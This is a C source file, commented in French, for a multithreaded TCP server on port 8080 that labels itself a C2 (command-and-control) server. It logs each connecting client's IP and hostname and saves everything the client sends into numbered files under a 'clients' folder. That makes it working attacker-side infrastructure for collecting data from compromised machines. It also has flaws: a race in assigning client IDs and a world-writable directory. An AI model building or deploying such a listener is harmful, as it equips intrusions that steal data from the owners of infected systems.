#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <signal.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <dirent.h> // Pour gérer les fichiers dans le dossier

#define PORT 8080
#define BUFFER_SIZE 1024
#define CLIENT_DIR "clients"
#define LOG_FILE "./server.log"  // Fichier de log dans le dossier actuel

// Fonction pour écrire dans le fichier log
void write_log(const char *message) {
    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
        fprintf(log_file, "[%s] %s\n", timestamp, message);
        fclose(log_file);
    } else {
        perror("Erreur d'ouverture du fichier log");
    }
}

// Fonction pour compter le nombre de fichiers dans le dossier clients
int count_client_files() {
    int count = 0;
    struct dirent *entry;
    DIR *dir = opendir(CLIENT_DIR);

    if (dir == NULL) {
        // Si le dossier n'existe pas encore, retournez 0
        if (errno == ENOENT) {
            return 0;
        }
        perror("Erreur d'ouverture du dossier clients");
        write_log("Erreur d'ouverture du dossier clients.");
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        // Ignorer les entrées spéciales "." et ".."
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            count++;
        }
    }

    closedir(dir);
    return count;
}

// Fonction pour gérer les connexions clients
void *client_handler(void *client_socket) {
    int sock = *(int *)client_socket;
    free(client_socket);

    char buffer[BUFFER_SIZE];
    char filename[256];
    char client_ip[INET_ADDRSTRLEN];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);

    if (getpeername(sock, (struct sockaddr *)&client_addr, &addr_len) == -1) {
        perror("Erreur lors de la récupération des informations client");
        write_log("Erreur lors de la récupération des informations client.");
        close(sock);
        return NULL;
    }

    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

    struct hostent *host_info = gethostbyaddr(&client_addr.sin_addr, sizeof(client_addr.sin_addr), AF_INET);
    const char *hostname = (host_info != NULL) ? host_info->h_name : "Inconnu";

    char username[50] = "UtilisateurInconnu"; // Simulation

    // Afficher les informations du client dans le terminal
    printf("Nouvelle connexion :\n");
    printf("  Adresse IP : %s\n", client_ip);
    printf("  Nom d'hôte : %s\n", hostname);
    printf("  Nom d'utilisateur : %s\n", username);

    // Logger les informations du client
    char log_message[256];
    snprintf(log_message, sizeof(log_message), "Connexion client : IP=%s, Hostname=%s, Username=%s", client_ip, hostname, username);
    write_log(log_message);

    // Créer le dossier pour les fichiers clients
    if (mkdir(CLIENT_DIR, 0777) == -1 && errno != EEXIST) {
        perror("Erreur de création du dossier clients");
        write_log("Erreur de création du dossier clients.");
        close(sock);
        return NULL;
    }

    // Générer un identifiant basé sur le nombre de fichiers dans le dossier
    int client_id = count_client_files();
    if (client_id < 0) {
        close(sock);
        return NULL; // Une erreur s'est produite
    }

    // Créer le fichier pour le client
    snprintf(filename, sizeof(filename), "%s/client_%d.txt", CLIENT_DIR, client_id);
    FILE *file = fopen(filename, "w");
    if (!file) {
        perror("Erreur d'ouverture de fichier");
        write_log("Erreur d'ouverture du fichier client.");
        close(sock);
        return NULL;
    }

    // Écrire les informations du client dans le fichier
    fprintf(file, "Adresse IP : %s\n", client_ip);
    fprintf(file, "Nom d'hôte : %s\n", hostname);
    fprintf(file, "Nom d'utilisateur : %s\n", username);
    fprintf(file, "----------------------\n");
    fflush(file); // S'assurer que les données sont écrites immédiatement

    // Recevoir les données du client et les écrire dans le fichier
    int bytes_received;
    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';
        fprintf(file, "%s", buffer);
        fflush(file); // S'assurer que les données sont écrites immédiatement
    }

    if (bytes_received == 0) {
        printf("Client déconnecté : %d\n", sock);
        snprintf(log_message, sizeof(log_message), "Client déconnecté : %d", sock);
        write_log(log_message);
    } else if (bytes_received < 0) {
        perror("Erreur de réception");
        write_log("Erreur de réception des données du client.");
    }

    fclose(file);
    close(sock);
    return NULL;
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);

    write_log("Démarrage du serveur C2...");

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Erreur de création du socket");
        write_log("Erreur de création du socket.");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur de liaison");
        write_log("Erreur de liaison du socket.");
        close(server_socket);
        return 1;
    }

    if (listen(server_socket, 10) < 0) {
        perror("Erreur d'écoute");
        write_log("Erreur d'écoute sur le socket.");
        close(server_socket);
        return 1;
    }

    printf("Serveur C2 en attente de connexions sur le port %d...\n", PORT);
    write_log("Serveur C2 prêt à accepter des connexions.");

    while (1) {
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
        if (client_socket < 0) {
            perror("Erreur d'acceptation");
            write_log("Erreur d'acceptation d'une connexion client.");
            continue;
        }

        pthread_t thread_id;
        int *new_sock = malloc(sizeof(int));
        if (!new_sock) {
            perror("Erreur d'allocation mémoire");
            write_log("Erreur d'allocation mémoire pour un nouveau client.");
            close(client_socket);
            continue;
        }
        *new_sock = client_socket;

        if (pthread_create(&thread_id, NULL, client_handler, (void *)new_sock) != 0) {
            perror("Erreur de création de thread");
            write_log("Erreur de création de thread pour un client.");
            free(new_sock);
            close(client_socket);
        }

        pthread_detach(thread_id);
    }

    close(server_socket);
    write_log("Serveur arrêté.");
    return 0;
}
